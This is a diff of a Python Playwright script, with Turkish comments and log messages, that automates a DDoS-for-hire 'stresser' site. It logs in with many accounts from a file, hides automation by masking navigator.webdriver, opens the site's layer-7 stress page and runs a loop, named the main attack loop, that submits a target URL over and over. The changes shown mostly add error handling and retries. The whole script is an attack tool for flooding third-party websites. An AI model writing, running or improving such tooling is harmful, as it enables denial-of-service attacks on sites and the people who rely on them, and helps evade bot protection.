@@ -5,7 +5,7 @@ import sys
 from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
 
 ACCOUNTS_FILE = "accounts.txt"
-MAX_CONCURRENT = 2  # Aynı anda en fazla 2 hesap çalışsın
+MAX_CONCURRENT = 2
 
 def load_accounts():
     accounts = []
@@ -57,32 +57,65 @@ def attack_worker(account):
                     viewport={"width": 1280, "height": 720},
                     user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                     args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
-                    slow_mo=100  # Her işlemi 100ms geciktir (bot koruması)
+                    slow_mo=100
                 )
                 page = context.new_page()
                 page.add_init_script("""
                     Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                 """)
 
-                print(f"[{username}] 🔐 Giriş yapılıyor...")
+                print(f"[{username}] 🔐 Giriş sayfasına gidiliyor...")
                 try:
-                    # Login sayfasına git (sadece DOM yüklensin yeter)
-                    page.goto("https://l7srv.cc/login", timeout=120000, wait_until="domcontentloaded")
-                    page.wait_for_load_state("domcontentloaded", timeout=60000)
-                    time.sleep(2)
+                    # 1. Sayfayı yükle ve HTTP durum kodunu yakala
+                    response = page.goto("https://l7srv.cc/login", timeout=30000, wait_until="domcontentloaded")
+                    if response:
+                        print(f"[{username}] ✅ Sayfa yüklendi. HTTP Durum Kodu: {response.status}")
+                        if response.status >= 400:
+                            print(f"[{username}] ⚠️ HTTP hatası: {response.status} - Sayfa mevcut değil veya erişim engeli.")
+                            raise Exception(f"HTTP {response.status}")
+                    else:
+                        print(f"[{username}] ❌ Yanıt alınamadı (response None).")
+                        raise Exception("No response")
+                    
+                    # 2. DOM'un yüklenmesini bekle
+                    page.wait_for_load_state("domcontentloaded", timeout=10000)
+                    time.sleep(1)
+                    
+                    # 3. Kullanıcı adı alanının varlığını kontrol et
+                    if page.locator("#username").count() == 0:
+                        print(f"[{username}] ⚠️ #username alanı bulunamadı, sayfa farklı olabilir.")
+                    else:
+                        print(f"[{username}] ✅ #username alanı mevcut.")
 
-                    # Formu doldur
+                    # 4. Formu doldur
+                    print(f"[{username}] 📝 Form dolduruluyor...")
                     page.fill("#username", username)
                     page.fill("#password", password)
 
-                    # Buton aktif olana kadar bekle (en fazla 30 sn)
-                    page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=30000)
+                    # 5. Buton aktifleşene kadar bekle
+                    print(f"[{username}] ⏳ Buton aktifleşmesi bekleniyor...")
+                    page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=15000)
                     page.click("#loginNextBtn")
+                    print(f"[{username}] 🖱️ Butona tıklandı.")
 
-                    # Dashboard'a yönlenene kadar bekle (timeout 60 sn)
+                    # 6. Dashboard'a yönlenene kadar bekle
                     page.wait_for_url(lambda url: "/dash" in url, timeout=60000)
-                    print(f"[{username}] ✅ Giriş başarılı.")
+                    print(f"[{username}] ✅ Giriş başarılı, dashboard'a yönlendirildi.")
                     consecutive_errors = 0
+
+                except PlaywrightTimeout as timeout_err:
+                    print(f"[{username}] ❌ Zaman aşımı: {timeout_err}")
+                    try:
+                        current_url = page.url
+                        print(f"[{username}] 📍 Mevcut URL: {current_url}")
+                    except:
+                        pass
+                    context.close()
+                    consecutive_errors += 1
+                    wait_time = 30 if consecutive_errors < 3 else 120
+                    print(f"[{username}] ⏳ {wait_time} saniye bekleniyor...")
+                    time.sleep(wait_time)
+                    continue
                 except Exception as login_err:
                     print(f"[{username}] ❌ Giriş hatası: {login_err}")
                     context.close()
@@ -92,23 +125,30 @@ def attack_worker(account):
                     time.sleep(wait_time)
                     continue
 
-                # Stress sayfası
-                print(f"[{username}] 📡 Stress sayfası...")
+                # ---------- STRESS SAYFASI ----------
+                print(f"[{username}] 📡 Stress sayfasına gidiliyor...")
                 try:
-                    page.goto("https://l7srv.cc/dash/stress", timeout=120000, wait_until="domcontentloaded")
-                    page.wait_for_load_state("domcontentloaded", timeout=60000)
-                    time.sleep(3)
-                    page.locator("#layer_7").wait_for(state="visible", timeout=15000)
-                    page.locator("#layer_7").click()
+                    response = page.goto("https://l7srv.cc/dash/stress", timeout=30000, wait_until="domcontentloaded")
+                    if response:
+                        print(f"[{username}] ✅ Stress sayfası yüklendi. HTTP {response.status}")
+                    page.wait_for_load_state("domcontentloaded", timeout=10000)
+                    time.sleep(2)
+                    if page.locator("#layer_7").count() == 0:
+                        print(f"[{username}] ⚠️ #layer_7 bulunamadı, belki farklı bir sekme?")
+                    else:
+                        page.locator("#layer_7").click()
+                        print(f"[{username}] ✅ #layer_7 tıklandı.")
                     consecutive_errors = 0
                 except Exception as stress_err:
-                    print(f"[{username}] ❌ Stress hatası: {stress_err}")
+                    print(f"[{username}] ❌ Stress sayfası hatası: {stress_err}")
                     context.close()
                     consecutive_errors += 1
-                    time.sleep(30 if consecutive_errors < 3 else 120)
+                    wait_time = 30 if consecutive_errors < 3 else 120
+                    print(f"[{username}] ⏳ {wait_time} saniye bekleniyor...")
+                    time.sleep(wait_time)
                     continue
 
-                # Ana saldırı döngüsü
+                # ---------- ANA SALDIRI DÖNGÜSÜ ----------
                 while True:
                     try:
                         page.fill("#l7host", target_url, timeout=15000)
@@ -132,7 +172,6 @@ def attack_worker(account):
                                     break
                             time.sleep(2)
 
-                        # Sayfayı yenile ve devam et
                         page.reload()
                         page.wait_for_load_state("domcontentloaded", timeout=30000)
                         time.sleep(2)
@@ -159,7 +198,6 @@ if __name__ == "__main__":
     accounts = load_accounts()
     print(f"✅ {len(accounts)} hesap yüklendi.")
 
-    # Thread havuzu (en fazla MAX_CONCURRENT aktif)
     semaphore = threading.Semaphore(MAX_CONCURRENT)
     def worker_wrapper(acc):
         with semaphore:
@@ -170,7 +208,7 @@ if __name__ == "__main__":
         t = threading.Thread(target=worker_wrapper, args=(acc,), daemon=True)
         t.start()
         threads.append(t)
-        time.sleep(2)  # Tarayıcılar arası çakışmayı azalt
+        time.sleep(2)
 
     try:
         while True:
